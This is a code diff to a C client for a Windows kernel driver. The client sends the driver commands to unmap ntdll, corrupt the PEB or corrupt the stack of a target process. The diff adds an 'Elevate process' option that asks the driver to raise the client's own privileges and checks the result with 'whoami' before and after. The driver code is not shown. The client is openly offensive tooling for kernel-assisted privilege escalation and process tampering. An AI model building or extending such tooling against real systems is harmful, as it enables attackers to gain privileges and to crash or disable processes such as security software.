@@ -66,28 +66,56 @@ int main()
 		if (code == 1)
 		{
 			ctlcode = IO_UNMAP_NTDLL;
-			printf("Unmap ntdll\n");
+			printf("[+] Unmap ntdll\n");
 			printf("Waiting for target proc...\n");
 			break;
 		}
 		else if (code == 2)
 		{
 			ctlcode = IO_CORRUPT_PEB;
-			printf("PEB corruption\n");
+			printf("[+] PEB corruption\n");
 			printf("Waiting for target proc...\n");
 			break;
 		}
 		else if (code == 3)
 		{
 			ctlcode = IO_CORRUPT_STACK;
-			printf("Stack corruption\n");
+			printf("[+] Stack corruption\n");
 			printf("Waiting for target proc...\n");
 			break;
 
 		}
+		else if (code == 4)
+		{
+			ctlcode = IO_ELEVATE_PROCESS;
+			printf("[+] Elevate process\n");
+
+			DWORD pid = GetCurrentProcessId();
+
+			printf("whoami result #1: ");
+			system("whoami");
+
+
+			if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
+			{
+				printf("DeviceIoControl failed for PID %lu with error %lu\n", pid, GetLastError());
+				Sleep(10000);
+				ExitProcess(0);
+			}
+
+			Sleep(5000);
+			
+			printf("whoami result #2: ");
+			system("whoami");
+
+			while (true)
+			{
+				Sleep(1);
+			}
+		}
 		else
 		{
-			printf("Wrong input\n");
+			printf("[-] Wrong input\n");
 		}
 	}
 
